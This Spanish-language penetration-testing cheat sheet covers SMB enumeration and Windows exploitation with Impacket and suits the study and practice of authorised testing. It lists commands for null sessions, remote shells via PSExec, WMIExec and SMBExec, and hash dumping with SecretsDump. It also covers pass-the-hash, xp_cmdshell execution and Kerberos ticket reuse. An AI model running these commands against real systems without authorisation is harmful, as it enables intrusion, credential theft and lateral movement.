# SMB / Impacket — Enumeración y Explotación Windows

> [!info] Herramientas
> SMB para compartir archivos en red. Impacket para explotación de servicios Windows (PSExec, WMIExec, SecretsDump).
## Enumeración SMB

> [!tip] Primer paso
> Listar shares y usuarios antes de intentar conectarte.

```bash

# Listar shares (sin auth)
smbclient -L //IP -N

# Listar shares con credenciales
smbclient -L //IP -U user%pass

# Conectar a share específico
smbclient //IP/share -U user%pass
```

### Nmap Scripts SMB

```bash
# Enumerar shares
nmap -p 445 --script smb-enum-shares

# Enumerar usuarios
nmap -p 445 --script smb-enum-users

# Descubrir OS
nmap -p 445 --script smb-os-discovery

# Modo de seguridad
nmap -p 445 --script smb-security-mode

# Verificar EternalBlue
nmap -p 445 --script smb-vuln-ms17-010
| ```
## Null Sessions

> [!warning] Sin autenticación
> Algunos servidores permiten acceso sin credenciales.

```bash

# Null session con smbclient
smbclient -L //IP -N

# Null session con enum4linux
enum4linux -a -U "" -P "" //IP

# Null session con rpcclient
rpcclient -U "" //IP
| ```
## SMBClient

> [!note] Navegación
> Funciona similar a un FTP.

| Comando | Descripción |

| `ls` | Listar archivos |
| `cd directorio` | Cambiar directorio |
| `pwd` | Directorio actual |
| `get archivo.txt` | Descargar archivo |
| `put archivo.txt` | Subir archivo |
| `mget *.txt` | Descargar todos los .txt |

```bash
# Descargar a ruta local
get archivo.txt /local/path

# Subir desde ruta local
put /local/path/archivo.txt
| ```
## Enum4linux

> [!important] Enumeración completa
> Combina múltiples herramientas en una sola.

```bash

# Enumeración completa
enum4linux -a //IP

# Solo usuarios
enum4linux -U //IP

# Solo shares
enum4linux -S //IP

# Políticas de password
enum4linux -P //IP

# Con credenciales
enum4linux -a -U user%pass //IP
| ```
## Impacket — PSExec

> [!danger] Shell interactiva
> PSExec da una shell de Windows a través de SMB.

```bash

# Shell interactiva
impacket-psexec user:pass@IP

# Con Pass-the-Hash
impacket-psexec -hashes :HASH user@IP

# Shell como SYSTEM
psexec.py user:pass@IP -s cmd.exe
| ```
## Impacket — WMIExec

> [!tip] Semi-interactiva
> Más stealth que PSExec, ejecuta comandos vía WMI.

```bash

# Shell semi-interactiva
impacket-wmiexec user:pass@IP

# Con Pass-the-Hash
impacket-wmiexec -hashes :HASH user@IP

# Comando específico
impacket-wmiexec user:pass@IP "whoami"
```

---

## Impacket — SMBExec

```bash
# Shell semi-interactiva via SMB
impacket-smbexec user:pass@IP

# Con Pass-the-Hash
impacket-smbexec -hashes :HASH user@IP
| ```
## Impacket — SecretsDump

> [!warning] Extracción de hashes
> Dump completo de hashes SAM, LSA y NTDS.

```bash

# Dump de hashes
impacket-secretsdump user:pass@IP

# Con Pass-the-Hash
impacket-secretsdump -hashes :HASH user@IP

# Solo NTLM del DC
impacket-secretsdump -just-dc-ntlm user:pass@IP

# Archivos offline
impacket-secretsdump -sam sam.save -system system.save -security security.save
```

---

## Impacket — MSSQLClient

```bash
# Conectar a MSSQL
impacket-mssqlclient user:pass@IP

# Autenticación Windows
impacket-mssqlclient -windows-auth user:pass@IP

# Habilitar xp_cmdshell
impacket-mssqlclient user:pass@IP --enable-xp_cmdshell

# Ejecutar comando
impacket-mssqlclient user:pass@IP -c "xp_cmdshell whoami"
| ```
## Pass-the-Hash

> [!danger] Técnica avanzada
> Permite autenticarte con el hash NTLM sin conocer la contraseña.

```bash

# Formato del hash
-hashes :NTLM_HASH # Solo NTLM
-hashes LM_HASH:NTLM_HASH # LM + NTLM

# PTH con diferentes herramientas
impacket-psexec -hashes :HASH user@IP
impacket-wmiexec -hashes :HASH user@IP
impacket-smbexec -hashes :HASH user@IP
impacket-secretsdump -hashes :HASH user@IP
```

---

## Kerberos

```bash
# Kerberos authentication
impacket-psexec -dc-ip DC_IP -k domain/user:pass@target

# Usar ticket existente
export KRB5CCNAME=/tmp/ticket.ccache
impacket-psexec -k -no-pass domain/user@target
```

---

#checklist
- [ ] SMB enumeration completada
- [ ] Shares listados
- [ ] Null session probado
- [ ] Credenciales encontradas
- [ ] PSExec/WMIExec intentado
- [ ] SecretsDump para hashes
- [ ] Pass-the-Hash probado